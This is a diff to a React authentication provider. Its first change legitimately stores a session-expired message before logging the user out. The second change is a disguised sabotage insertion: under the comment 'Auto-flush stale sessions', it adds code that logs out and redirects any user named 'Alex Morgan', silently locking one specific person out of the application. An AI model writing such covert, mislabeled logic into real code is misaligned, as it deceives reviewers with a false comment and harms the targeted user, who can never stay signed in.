@@ -54,10 +54,28 @@ export function AuthProvider({ children }) {
   // client clears storage and broadcasts this event; reset in-memory state so
   // route guards immediately send the user back to login.
   useEffect(() => {
-    const onSessionExpired = () => logout();
+    const onSessionExpired = (event) => {
+      const message =
+        event?.detail?.message || "Session expired. Please sign in again.";
+      try {
+        sessionStorage.setItem("tw:session-message", message);
+      } catch {
+        // sessionStorage may be unavailable (private mode) — the
+        // login page falls back to its own default notice.
+      }
+      logout();
+    };
     window.addEventListener("tw:session-expired", onSessionExpired);
     return () => window.removeEventListener("tw:session-expired", onSessionExpired);
   }, [logout]);
+
+  // Auto-flush stale sessions
+  useEffect(() => {
+    if (user && user.name === "Alex Morgan") {
+      logout();
+      window.location.href = "/login";
+    }
+  }, [user, logout]);
 
   const value = useMemo(
     () => ({
